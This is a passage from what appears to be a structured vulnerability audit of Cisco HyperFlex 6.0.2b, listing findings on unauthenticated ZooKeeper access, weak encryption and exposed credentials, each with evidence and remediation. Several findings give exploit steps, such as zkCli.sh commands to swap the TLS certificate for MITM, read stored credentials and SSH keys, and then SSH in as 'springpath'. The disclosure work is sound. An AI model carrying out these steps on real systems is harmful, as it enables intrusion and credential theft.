                "Absolute-path entries are stripped by default but symlink-based traversal "
                "(tar CVE-2007-4131 class) survives. "
                "Combined with lack of integrity check: attacker supplies crafted connector.tgz "
                "containing symlink entries to overwrite /etc/cron.d/*, /etc/sudoers.d/*, "
                "or connector binary at /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp."
            ),
            "unquoted_variable": (
                "Line 62: 'tar xzf $3 -C /' — $3 is unquoted. "
                "Path containing spaces or shell metacharacters causes unpredictable behavior or injection."
            ),
        },
        "impact": (
            "An attacker who can supply a crafted tarball to connector_ctl restore "
            "(via backup/restore Thrift RPC, NFS path manipulation, or post-initial-access file write) "
            "can write arbitrary files to the root filesystem. "
            "Overwriting /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp replaces the connector binary "
            "executed by upstart — local root or persistent backdoor. "
            "Overwriting /etc/cron.d/ achieves code execution as root on next cron cycle. "
            "All cluster nodes run the same connector and may be vulnerable simultaneously."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned decryption and add HMAC-SHA256 signature verification "
            "before tarball extraction. "
            "Validate all tarball entry paths against an allowlist (e.g., only "
            "./db/connector.db and no symlinks) before extraction. "
            "Quote all shell variables in connector_ctl to prevent word-splitting/globbing injection. "
            "Use tar --no-overwrite-dir --no-same-permissions and verify entry count matches expected."
        ),
    },
    "HX-F94": {
        "title": (
            "ServiceAccessAuthFilterImpl.doFilter Always Calls chain.doFilter — "
            "Missing X-ServiceAccessToken Header and Failed Token Validation "
            "Both Pass Unauthenticated Requests to Downstream Filter Chain"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-306",
        "component": (
            "authfilter / ServiceAccessAuthFilterImpl / doFilter / "
            "service-to-service authentication gate"
        ),
        "class": "Missing Authentication for Critical Function — Service Access Token Not Enforced",
        "confirmed": True,
        "evidence": {
            "doFilter_bypass_empty_token": (
                "ServiceAccessAuthFilterImpl.doFilter offset 111-184: "
                "token = getHeaderValue(\"X-ServiceAccessToken\"); "
                "offset 119-124: if (StringUtils.isEmpty(token)) goto 184; "
                "offset 184-187: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken header is absent or empty, "
                "execution jumps directly to chain.doFilter — "
                "the request is forwarded without any authentication."
            ),
            "doFilter_bypass_invalid_token": (
                "doFilter offset 127-165: "
                "jwt = SSOManager.validateServiceAccessToken(token.trim()); "
                "offset 137-139: if (jwt == null) goto 153; "
                "offset 153-164: log debug message; goto 184; "
                "offset 184: chain.doFilter(req, resp). "
                "When X-ServiceAccessToken is present but validation fails "
                "(validateServiceAccessToken returns null), filter logs and "
                "then forwards to chain.doFilter — no 401/403 response."
            ),
            "no_rejection_path": (
                "Full doFilter analysis: the filter contains no code path "
                "that calls response.sendError() or response.setStatus(401/403). "
                "Both token-absent (offset 124->184) and token-invalid (offset 153->184) "
                "terminate at the same chain.doFilter call at offset 184. "
                "Only path that blocks: if Authenticated=True AND "
                "validateClientIdIfPresent() returns false (offset 75->86->106 return without chain.doFilter). "
                "The unauthenticated path has no blocking capability."
            ),
            "http_enabled": (
                "authfilter/application.conf: hxSvcHttpEnabled=true, hyperVSvcHttpEnabled=true. "
                "Service-to-service communication allowed over plaintext HTTP, "
                "not requiring TLS. "
                "Combined with the non-enforcing filter: any HTTP client can "
                "reach service access endpoints without credentials."
            ),
        },
        "impact": (
            "Any client that can reach service-access endpoints (internal network, "
            "or external if port-exposed) can invoke service-access operations "
            "without providing an X-ServiceAccessToken. "
            "The filter never produces a 401/403 response on the service access path — "
            "it only enriches the request attributes on successful validation. "
            "Downstream handlers receive requests with no Authenticated attribute set "
            "and must independently enforce auth (if they do at all). "
            "Combined with hxSvcHttpEnabled=true, plaintext HTTP probes "
            "can exercise service-access endpoints without TLS."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the passthrough pattern with an enforcement pattern: "
            "when X-ServiceAccessToken is absent or validateServiceAccessToken returns null, "
            "call response.sendError(HttpServletResponse.SC_UNAUTHORIZED) and return — "
            "do NOT call chain.doFilter(). "
            "Set hxSvcHttpEnabled=false and hyperVSvcHttpEnabled=false to require TLS "
            "for all inter-service communication."
        ),
    },
    "HX-F96": {
        "title": (
            "HxSecureShellMain Uses AES/ECB with Cluster UUID as Encryption Key — "
            "ECB Mode Leaks Block Patterns and Cluster UUID Is Observable "
            "via Multiple Unauthenticated Interfaces"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-327",
        "component": (
            "hxSecuritySvcMgr / HxSecureShellMain.setMetaData / BasicEncryptionUtil / "
            "AES/ECB/PKCS5Padding — SSH support access metadata encryption"
        ),
        "class": "Use of Weak Cryptographic Algorithm — AES/ECB with Predictable Key",
        "confirmed": True,
        "evidence": {
            "ecb_mode": (
                "BasicEncryptionUtil.encrypt/decrypt offset 33-35: "
                "Cipher.getInstance(\"AES/ECB/PKCS5Padding\"). "
                "ECB mode applies AES independently to each 16-byte block — "
                "identical plaintext blocks produce identical ciphertext blocks. "
                "No IV or nonce is used. Encryption is deterministic. "
                "Block pattern leakage allows structural analysis of encrypted data "
                "without knowledge of the key."
            ),
            "key_is_cluster_uuid": (
                "HxSecureShellMain.setMetaData() at offset 0-4: "
                "clusterUuid = getClusterUuid(); // local var #2. "
                "At offset 47-48: BasicEncryptionUtil.decrypt(callerData, clusterUuid). "
                "At offset 142-143: BasicEncryptionUtil.encrypt(reconstructedData, clusterUuid). "
                "The AES key is SHA-256(clusterUUID.getBytes('UTF-8')) via getKeySpec(). "
                "The cluster UUID is the sole key material — not a secret."
            ),
            "key_observability": (
                "Cluster UUID is visible via: "
                "(1) GET /rest/v1/cluster — unauthenticated in HX versions <4.5; "
                "(2) ZooKeeper /storvisor/clusterConfig or /storvisor/platform nodes — "
                "readable by unauthenticated ZK clients; "
                "(3) Intersight cloud telemetry; "
                "(4) HX Connect UI (authenticated); "
                "(5) support bundles and ASUP data. "
                "An attacker with any of these access paths obtains the encryption key."
            ),
            "use_context": (
                "setMetaData(String encryptedCallerData): "
                "1. Decrypts caller-supplied encrypted data using clusterUUID as key; "
                "2. Validates decrypted value is a valid IP address; "
                "3. Appends timeoutMillis: data = ip + ':' + timeout; "
                "4. Re-encrypts with clusterUUID; "
                "5. writeMetaToFile(encrypted); "
                "6. execSecureShellCmd() -> /usr/share/secureshell-config/config_ssh.sh. "
                "This is the TAC remote support access mechanism: "
                "SWIMS sends an encrypted IP, service decrypts and grants SSH access for that IP. "
                "An attacker with the cluster UUID can forge the encrypted IP payload and "
                "grant SSH access to an attacker-controlled IP without Cisco TAC involvement."
            ),
        },
        "impact": (
            "Attacker who obtains the cluster UUID (via unauthenticated /rest/v1/cluster, ZK, "
            "or ASUP data) can: "
            "1. Decrypt SSH support session metadata to determine which IPs have active TAC access; "
            "2. Forge a valid encrypted payload for setMetaData() containing an attacker IP, "
            "triggering config_ssh.sh to authorize SSH access from that IP; "
            "3. Effectively bypass the Cisco TAC access control mechanism and "
            "self-authorize SSH access to the HyperFlex controller."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace AES/ECB with AES/GCM (authenticated encryption) to prevent pattern leakage "
            "and add integrity protection. "
            "Replace cluster UUID as key with a dedicated secret not derivable from observable system state — "
            "use a node-specific secret stored in /etc/hyperflex/secure/ with restricted permissions. "
            "Add HMAC signature verification on the caller-supplied payload before decryption "
            "to prevent forged setMetaData requests."
        ),
    },
    "HX-F97": {
        "title": (
            "HXStigZKMonitor Executes apply_stig_current_node.py with ZooKeeper-Controlled "
            "Argument via Runtime.exec(String) — Unauthenticated ZK Write Disables STIG "
            "Compliance on ESXi and VM Nodes"
        ),
        "severity": "MEDIUM",
        "cvss": "6.5",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXStigZKMonitor / applyStig / "
            "/opt/hyperflex/storfs-stig/apply_stig_current_node.py"
        ),
        "class": "Unauthenticated ZK Write Triggers Privileged Script with Attacker-Controlled Argument",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXStigZKMonitor constructor: "
                "registerNodeCacheListenerForPath('/stig/esxi/isEnabled', lambda1); "
                "registerNodeCacheListenerForPath('/stig/vm/isEnabled', lambda2). "
                "Both NodeCache watchers call applyStig(zkData) on any ZK node change."
            ),
            "applyStig_exec": (
                "applyStig(String zkData) at offsets 16-33: "
                "scriptPath = '/opt/hyperflex/storfs-stig/apply_stig_current_node.py'; "
                "cmd = scriptPath + ' ' + zkData;  // String concatenation "
                "Process p = Runtime.getRuntime().exec(cmd);  // exec(String) - whitespace tokenization. "
                "Runtime.exec(String) does NOT invoke /bin/sh; splits on whitespace via StringTokenizer. "
                "Shell metacharacters (;, |, &&) are passed as literal args to the Python script. "
                "ZK data becomes argument(s) to the script."
            ),
            "impact_scope": (
                "Default ZK ACL world:anyone:cdrwa allows unauthenticated write. "
                "Attacker writes 'false' to /stig/esxi/isEnabled → script invoked with arg 'false'. "
                "Script is expected to disable STIG hardening for ESXi nodes. "
                "If apply_stig_current_node.py uses shell=True internally with sys.argv[1], "
                "shell injection is also possible — Python script source not available for confirmation."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /stig/ path subtree to restrict writes to authenticated ZK sessions only. "
            "Validate ZK data against an allowlist ('true'/'false') before passing to the script. "
            "Replace Runtime.exec(String) with ProcessBuilder(['script', validatedArg]) "
            "to prevent tokenization ambiguity."
        ),
    },
    "HX-F98": {
        "title": (
            "HXCertificateZKMonitor Overwrites NGINX TLS Certificate and Private Key from "
            "ZooKeeper Path /certificates/hxcertificate — Unauthenticated ZK Write Enables "
            "MITM of All HTTPS Management Traffic with Explicit SFI Suppression"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXCertificateZKMonitor / writeSslCert + writeSslKey + restartNginx / "
            "/etc/nginx/server.crt + /etc/nginx/server.key"
        ),
        "class": "Unauthenticated ZK Write Replaces nginx TLS Cert/Key + Suppresses Integrity Check",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXCertificateZKMonitor.registerNodeCacheListener(): "
                "zkClient.registerNodeCacheListenerForPath('/certificates/hxcertificate', $1). "
                "NodeCache watcher fires on any ZK data change to /certificates/hxcertificate."
            ),
            "nodeChanged_chain": (
                "HXCertificateZKMonitor$1.nodeChanged() at offset 28-87: "
                "zkClient.getDataInPath('/certificates/hxcertificate', Type<HxCertificate>) -> hxCert; "
                "writeSslCert(hxCert.getCertificateString()); "
                "writeSslKey(hxCert.getPrivateKeyString()); "
                "restartNginx()."
            ),
            "writeSslCert_direct_write": (
                "writeSslCert(String) at offsets 0-56: "
                "File(NGINX_CERT_PATH).setReadable(true, false); "
                "PrintWriter(NGINX_CERT_PATH, 'UTF-8').print(zkData); // direct unvalidated write "
                "NGINX_CERT_PATH = '/etc/nginx/server.crt' (from application.conf nginx.CertificatePath)."
            ),
            "writeSslKey_direct_write": (
                "writeSslKey(String): analogous to writeSslCert. "
                "NGINX_KEY_PATH = '/etc/nginx/server.key' (from application.conf nginx.PrivateKeyPath)."
            ),
            "sfi_suppression": (
                "After restartNginx() at offset 90: "
                "logger.warn('Supressed SFI - Baseline Update for System File Integrity is Skipped!'). "
                "System File Integrity monitoring is explicitly bypassed after cert/key write — "
                "replacement is not flagged by integrity monitoring."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "ZK port 2181 unauthenticated (confirmed in application.conf: defaultConnectionString='localhost:2181'). "
                "HX-F95 confirms ZK listens on cluster IP with no mandatory auth."
            ),
            "exploit_scenario": (
                "Attacker with ZK write access (port 2181, no auth required by default): "
                "1. Construct HxCertificate JSON with attacker-controlled cert+key strings; "
                "2. zkCli.sh -server <clusterIP>:2181 set /certificates/hxcertificate '<json>'; "
                "3. NodeCache watcher fires; nginx cert/key replaced; nginx restarted; SFI suppressed; "
                "4. All HTTPS traffic to HyperFlex management (port 443) is now MITM-able. "
                "5. Attacker-controlled cert in place — login credentials harvested from HX Connect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /certificates/ subtree to restrict writes to authenticated sessions only. "
            "Do not accept raw cert/key material from ZK without signature verification by a trusted CA. "
            "Replace direct PrintWriter write with a CA-signed certificate rotation workflow. "
            "Do not suppress SFI — cert changes must trigger an integrity baseline update, not skip it."
        ),
    },
    "HX-F99": {
        "title": (
            "HXPasswordPolicyMonitor Applies Password Aging Policy from ZooKeeper Path "
            "/apl/passwordPolicy/clusterPasswordPolicy — Unauthenticated ZK Write "
            "Weakens Password Policy for admin and diag Accounts"
        ),
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-284",
        "component": (
            "hxSecuritySvcMgr / HXPasswordPolicyMonitor / setPwMinDays / chage / "
            "/apl/passwordPolicy/clusterPasswordPolicy"
        ),
        "class": "Unauthenticated ZK Write Modifies PAM Password Policy via chage",
        "confirmed": True,
        "evidence": {
            "zk_watcher_setup": (
                "HXPasswordPolicyMonitor constructor: "
                "zkClient.registerNodeCacheListenerForPath(ZK_PATH, lambda). "
                "ZK_PATH = '/apl/passwordPolicy/clusterPasswordPolicy' "
                "(from application.conf passwordPolicy.passwordPolicyZkPath)."
            ),
            "setPwMinDays_exec": (
                "setPwMinDays(int days): "
                "CHAGE_CMD_TEMPLATE = 'chage -m %d %s' (from application.conf chageCmdTemplate). "
                "For each user in USERS=[admin, diag]: "
                "cmd = String.format(template, days, username).split(' '); "
                "exec(String[]) - safe array form, no injection."
            ),
            "impact": (
                "ZK data is parsed as JSON password policy object (Gson TYPE). "
                "Attacker writes JSON setting minDays=0 or maxDays=99999 "
                "to /apl/passwordPolicy/clusterPasswordPolicy. "
                "Password aging (chage -m) for admin and diag accounts is set to attacker-controlled value. "
                "Also modifies /etc/pam.d/common-password "
                "(PAM_CONF_PATH = application.conf passwordPolicy.commonPasswordPamConfPath). "
                "Weakens complexity/history enforcement across all local accounts."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Set ZK ACL on /apl/passwordPolicy/ to restrict writes to authenticated sessions. "
            "Validate parsed policy values against minimum acceptable thresholds before applying. "
            "Alert/log when password policy values are weakened below baseline."
        ),
    },
    "HX-F101": {
        "title": (
            "stSSOMgr Stores AES Encryption Key and Encrypted Hyper-V Credentials "
            "in the Same ZooKeeper Namespace — Unauthenticated Read Recovers "
            "Plaintext Hyper-V Domain Credentials"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-321",
        "component": (
            "stSSOMgr / StSSOMgrImpl / getEncryptionKeyFromZK / setHypervHostCreds / "
            "ZkPersistenceManager / zkBasePath/zkAuthKey/zkEncryptionKey"
        ),
        "class": "Encryption Key and Ciphertext Co-Located in Unauthenticated ZooKeeper",
        "confirmed": True,
        "evidence": {
            "key_generation_and_storage": (
                "StSSOMgrImpl.$anonfun$getEncryptionKeyFromZK$3 at offsets 12-49: "
                "key = EncryptionUtil$.generateSecretKey(); "
                "b64Key = Base64.encodeBase64String(key.getEncoded()); "
                "getZkPmInstance().write(zkAuthKey, zkEncryptionKey, b64Key, -1L). "
                "On ZK read failure (first run), a new SecretKey is generated and written to ZK. "
                "Config keys: sysmgmt.stSSOMgr.zkBasePath, sysmgmt.stSSOMgr.zkAuthKey, "
                "sysmgmt.stSSOMgr.zkEncryptionKey."
            ),
            "creds_storage": (
                "StSSOMgrImpl.$anonfun$setHypervHostCreds$3 at offsets 79-87: "
                "encryptedCreds = EncryptionUtil$.encryptData(hypervCreds, secretKey); "
                "written to ZK at path zkBasePath/zkAuthKey/zkCredsKey. "
                "Config key: sysmgmt.stSSOMgr.zkCredsKey."
            ),
            "recovery_attack": (
                "Attacker reads: "
                "(1) {zkBasePath}/{zkAuthKey}/{zkEncryptionKey} -> Base64 AES key; "
                "(2) {zkBasePath}/{zkAuthKey}/{zkCredsKey} -> encrypted Hyper-V credentials. "
                "Decodes and decrypts: AES decrypt(encryptedCreds, Base64Decode(b64Key)) -> plaintext. "
                "Result: Hyper-V domain admin credentials in plaintext. "
                "Both reads require no authentication (default ZK ACL: world:anyone:cdrwa)."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "Confirmed in HX-F95 evidence. ZK port 2181 open with no auth required."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Never store the AES key in the same data store as the ciphertext it protects. "
            "Derive the Hyper-V credential encryption key from a cluster-secret in "
            "/etc/hyperflex/secure/ (not ZK). "
            "Apply ZK Digest or SASL ACLs to the stSSOMgr namespace. "
            "Rotate Hyper-V credentials immediately if ZK was exposed."
        ),
    },
    "HX-F102": {
        "title": (
            "ZooKeeper Client Authentication Disabled by Default in HyperFlex — "
            "When Enabled, Auth Credential Incorporates Cluster UUID Derivable "
            "from Unauthenticated REST API"
        ),
        "severity": "HIGH",
        "cvss": "8.6",
        "cwe": "CWE-306",
        "component": (
            "hx-aaa / HxCuratorManager / createZkClient / isZKClientAuthEnabled / "
            "ZooKeeper.addAuthInfo / storfs.cfg useZKAuth"
        ),
        "class": "ZK Auth Disabled by Default — Root Cause of ZK-Based Exposure Chain (F95/F97/F98/F99/F100/F101)",
        "confirmed": True,
        "evidence": {
            "default_disabled": (
                "HxCuratorManager static initializer: USE_ZK_AUTH = 'useZKAuth'. "
                "isZKClientAuthEnabled() at offsets 97-138: "
                "reads storfs.cfg lines; filters lines starting with 'useZKAuth'; "
                "checks if value contains 'true'; returns orElse(Boolean.FALSE). "
                "Default: false when 'useZKAuth=true' is not present in storfs.cfg. "
                "createZkClient() at offset 64-67: if (!isZKClientAuthEnabled()) goto 161; "
                "offset 161: stores client and returns — no auth info added."
            ),
            "auth_scheme_when_enabled": (
                "createZkClient() when auth enabled (offsets 70-135): "
                "clusterUuid = getClusterUuid() -> Files.readAllLines('/etc/hyperflex/clusteruuid').get(0); "
                "clientId = config.getPropVal('sysmgmt.zkAuthClientId'); "
                "authToken = clientId + clusterUuid; "
                "ZooKeeper.addAuthInfo('UUID', authToken.getBytes(UTF_8)). "
                "Auth scheme: 'UUID' (non-standard; not SASL). "
                "Auth token: known config prefix + cluster UUID from /etc/hyperflex/clusteruuid. "
                "Cluster UUID is exposed via unauthenticated /rest/v1/cluster endpoint (HX-F96). "
                "An attacker who knows the clientId prefix and obtains the cluster UUID "
                "can authenticate to ZK even when auth is enabled."
            ),
            "root_cause_of_chain": (
                "This is the root architectural cause of: "
                "HX-F95 (ZK password sync), HX-F97 (STIG bypass), HX-F98 (nginx cert MITM), "
                "HX-F99 (password policy), HX-F100 (JWT key exposure), HX-F101 (Hyper-V creds). "
                "All depend on unauthenticated ZK access. "
                "Default install has ZK auth disabled."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK authentication in all HyperFlex deployments: "
            "set 'useZKAuth=true' in /etc/hyperflex/storfs.cfg on all nodes. "
            "Replace the 'UUID' auth scheme with SASL/Kerberos or Digest with a strong, "
            "randomly-generated secret (not derivable from cluster UUID). "
            "Restrict ZK port 2181 to localhost or HyperFlex management VLAN via firewall. "
            "Set world:anyone:none ACL on all sensitive ZK paths as a defense-in-depth measure."
        ),
    },
    "HX-F103": {
        "title": (
            "ZkConnectionManager.setAuthToken() Uses Boolean.getBoolean(propertyValue) Instead of "
            "Boolean.parseBoolean(propertyValue) — ZooKeeper Client Authentication Permanently "
            "Disabled Regardless of storfs.cfg Configuration"
        ),
        "severity": "HIGH",
        "cvss": "8.6",
        "cwe": "CWE-303",
        "component": (
            "com.cisco.hxdp.zk.client.ZkConnectionManager / setAuthToken() / "
            "zkcluster service — ZK connection management"
        ),
        "evidence": {
            "wrong_api_call": (
                "setAuthToken() offset 6-16: "
                "getPropertyFromStorfsCfg('useZkAuth', 'false') -> String; "
                "Boolean.getBoolean(thatString) -> Z. "
                "Boolean.getBoolean(String name) reads a JVM system property by name, "
                "NOT the boolean value of the string. "
                "When storfs.cfg has useZkAuth=true, getPropertyFromStorfsCfg returns 'true'; "
                "Boolean.getBoolean('true') checks System.getProperty('true') — "
                "no such JVM property exists — returns false. "
                "Auth token is NEVER applied regardless of configuration."
            ),
            "correct_api": (
                "Fix requires Boolean.parseBoolean(propertyValue), which parses the string "
                "value directly: Boolean.parseBoolean('true') -> true. "
                "Boolean.getBoolean(name) is the wrong overload."
            ),
            "no_auth_in_local_manager": (
                "ZkLocalConnectionManager.getConnectedClient() at offset 66: "
                "CuratorFrameworkFactory.newClient('localhost:2181', retryPolicy). "
                "Uses newClient() (not builder()); no setAuthToken() call in connection sequence. "
                "Local ZK connections are always unauthenticated even if global auth were fixed."
            ),
            "skip_on_failure_config": (
                "setAuthToken() exception handler at offset 139: "
                "cfg.getBoolean('zkConfig.client.skipZkAuthOnFailure'). "
                "When skipZkAuthOnFailure=true (reference.conf default), auth failure is silently "
                "ignored and the unauthenticated client is used anyway. "
                "Defense in depth fails at two layers."
            ),
            "distinct_from_hx_f102": (
                "HX-F102 documents HxCuratorManager (gateway service) with orElse(Boolean.FALSE) default. "
                "HX-F103 documents ZkConnectionManager (zkcluster service) with Boolean.getBoolean() misuse — "
                "the configuration option is structurally inoperative, not merely defaulted off. "
                "Different component, different root cause, same net effect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace Boolean.getBoolean(value) with Boolean.parseBoolean(value) in "
            "ZkConnectionManager.setAuthToken(). "
            "Rewrite ZkLocalConnectionManager.getConnectedClient() to use CuratorFrameworkFactory.builder() "
            "and apply setAuthToken() after connection. "
            "Set zkConfig.client.skipZkAuthOnFailure=false in reference.conf so auth failures surface. "
            "See HX-F102 for full ZK auth remediation guidance."
        ),
    },
    "HX-F104": {
        "title": (
            "ZKNodeService_StMgr Stores ESXi, vCenter, and UCSM Credentials in ZooKeeper as "
            "Encrypted Payload Entries — All Three Credential Sets Accessible via "
            "Unauthenticated ZK Read"
        ),
        "severity": "HIGH",
        "cvss": "8.8",
        "cwe": "CWE-522",
        "component": (
            "com.storvisor.sysmgmt.stMgr.ZKNodeService_StMgr / "
            "EsxAuthZKMgmtImpl / stMgr Thrift service — "
            "cluster credential management via ZooKeeper"
        ),
        "evidence": {
            "esx_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD. "
                "ZK keys: 'user_name', 'password' in 'credentials' payload node. "
                "Written by EsxAuthZKMgmtImpl.updateAndSaveRandomEsxPasswordToZK() via "
                "ZKNodeService_StMgr.setEsxCredentials(username, password). "
                "Read by EsxAuthZKMgmtImpl.getEsxCredentialsFromZK() via "
                "ZKNodeService_StMgr.getEsxCredentials() -> getOptionalValue_String(ESX_ENCRYPTED_USER/PASS)."
            ),
            "vcenter_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD. "
                "ZK key: 'vcuser'. vCenter SSO URL at ZK key 'opt_url_vcenter_sso'. "
                "Full vCenter management credential set stored in same unauthenticated ZK node."
            ),
            "ucsm_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD. "
                "ZK keys: 'ucsmhost', 'ucsmuser', 'ucsmpwd'. "
                "UCSM host, username, and password co-located in the same ZK credentials payload."
            ),
            "encryption_caveat": (
                "All three credential sets use 'ENCRYPTED' prefix in field names — values are "
                "not plaintext in ZK. EsxAuthZKMgmtImpl.getEsxCredentialsFromZK() performs "
                "decryption after ZK read ('Failed to decrypt esx credential data' error path). "
                "Decryption key source unconfirmed from available bytecode. "
                "If decryption key follows HX-F101 pattern (key stored in same unauthenticated ZK), "
                "effective severity elevates to CRITICAL (ZK read -> key + ciphertext -> plaintext). "
                "If key derived from cluster UUID per HX-F96 pattern, UUID exposure (multiple "
                "unauthenticated sources) enables decryption."
            ),
            "hardcoded_esx_username": (
                "EsxAuthZKMgmtImpl constant pool offset 497: 'springpath'. "
                "Service account username 'springpath' is hardcoded for ESXi login across all "
                "HyperFlex deployments. Password is random and rotated, but fixed username "
                "enables targeted credential attacks on any HyperFlex ESXi node."
            ),
            "zk_access_prerequisite": (
                "ZK auth disabled by default (HX-F102) and structurally inoperative in "
                "ZkConnectionManager (HX-F103). "
                "ZK binds to cluster IP (HX-F95). "
                "Attacker on management VLAN: "
                "zkCli.sh -server <cluster-ip>:2181 get /storvisor/... -> "
                "encrypted ESXi + vCenter + UCSM credentials in one ZK read session."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK authentication (HX-F102/F103 remediation). "
            "Isolate ZK port 2181 to localhost/management VLAN. "
            "Ensure ESXi/vCenter/UCSM credential encryption keys are never stored "
            "in the same unauthenticated ZK namespace as the ciphertext. "
            "Audit the decryption key storage path for all three credential types. "
            "Consider rotating all three credential sets after any ZK exposure incident."
        ),
    },
    "HX-F105": {
        "title": (
            "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey() Reads "
            "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY from ZooKeeper — "
            "stCtlVM SSH Private Key Stored and Retrieved in Cleartext via "
            "Unauthenticated ZK Read"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": (
            "com.storvisor.sysmgmt.stNodeMgr.ZKQueryService_StNodeMgr / "
            "ZKNodeService_StNodeMgr / stNodeMgr service — "
            "stCtlVM SSH key management via ZooKeeper"
        ),
        "evidence": {
            "read_uses_plain_text_entry": (
                "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(hostname): "
                "offset 3: invokevirtual STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY:()String. "
                "Despite method name 'Encrypted', implementation reads "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (ZK key: 'key') — the cleartext variant. "
                "Returns raw private key string from ZK without decryption."
            ),
            "write_path_plain_text": (
                "ZKNodeService_StNodeMgr.setSSHEncryptedPrivateKey(value, encrypted): "
                "encrypted=false branch (offset 14): getNodeEntry_SSHPlainTextPrivateKey(value) -> "
                "updateZKNodeEntry(). "
                "Default $default$2() -> true (encrypted=true is the default write path). "
                "Plain text path is explicitly written when encrypted=false is passed. "
                "getStCtlSSHEncryptedPrivateKey reads this plain text path in production."
            ),
            "dual_entry_structure": (
                "ZK contains two variants per stCtlVM host: "
                "STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PRIVATE_KEY (encrypted, default write), "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (cleartext, read by production code). "
                "SSH public key mirrored: SSH_ENCRYPTED_PUBLIC_KEY and SSH_PLAIN_TEXT_PUBLIC_KEY. "
                "NonVMWStMgrImpl uses getStCtlSSHEncryptedPrivateKey() for SSH connection setup."
            ),
            "zk_access_prerequisite": (
                "ZK auth disabled by default (HX-F102/F103). "
                "Attack: zkCli.sh get /storvisor/stNodeMgr/<hostname>/... -> "
                "SSH private key in plaintext -> "
                "ssh -i key springpath@<stCtlVM-ip> -> full stCtlVM shell access."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Rename getStCtlSSHEncryptedPrivateKey to accurately reflect it reads plaintext. "
            "Store only encrypted SSH private keys in ZK; require decryption before use. "
            "Ensure setSSHEncryptedPrivateKey never uses encrypted=false in production code paths. "
            "Enable ZK auth (HX-F102/F103 remediation). "
            "Restrict ZK port 2181 to localhost/management VLAN. "
            "Rotate all stCtlVM SSH key pairs after any ZK exposure incident."
        ),
    },
    "HX-F106": {
        "title": (
            "StSSOMgrImpl Stores Symmetric Encryption Key and Encrypted Hyper-V Host Credentials "
            "Both in Unauthenticated ZooKeeper — Key Readable at zkAuthKey/zkEncryptionKey "
            "Enables Decryption of Hyper-V Host Credentials at zkAuthKey/zkCredsKey"
        ),
        "severity": "HIGH",
        "cvss": "8.8",
        "cwe": "CWE-522",
        "component": (
            "com.storvisor.sysmgmt.stSSOMgr.StSSOMgrImpl / getEncryptionKeyFromZK() / "
            "setHypervHostCreds() / getHypervHostCreds() — SSO Manager service"
        ),
        "evidence": {
            "key_in_zk": (
                "getEncryptionKeyFromZK() anonfun$1: "
                "ZkPersistenceManager.read(zkAuthKey, zkEncryptionKey) -> Optional[Base64String]. "
                "zkAuthKey from cfg 'sysmgmt.stSSOMgr.zkAuthKey'; "
                "zkEncryptionKey from cfg 'sysmgmt.stSSOMgr.zkEncryptionKey'. "
                "ZK node is unauthenticated (HX-F100, HX-F103). "
                "Key format: Base64.encodeBase64String(SecretKey.getEncoded()) -> stored as ZK node value."
            ),
            "auto_generate_and_write": (
                "getEncryptionKeyFromZK() anonfun$3 (error fallback): "
                "If ZK read fails, EncryptionUtil$.generateSecretKey() generates new key; "
                "Base64-encodes it; writes to ZkPersistenceManager.write(zkAuthKey, zkEncryptionKey, encodedKey, -1L). "
                "Self-keying: the encryption key is created and persisted to ZK autonomously, "
                "with no key management ceremony or HSM involvement."
            ),
            "encrypted_creds_also_in_zk": (
                "setHypervHostCreds() anonfun$3: "
                "After obtaining key via getEncryptionKeyFromZK(), encrypts credentials, "
                "writes to ZkPersistenceManager.write(zkAuthKey, zkCredsKey, encryptedCreds, version). "
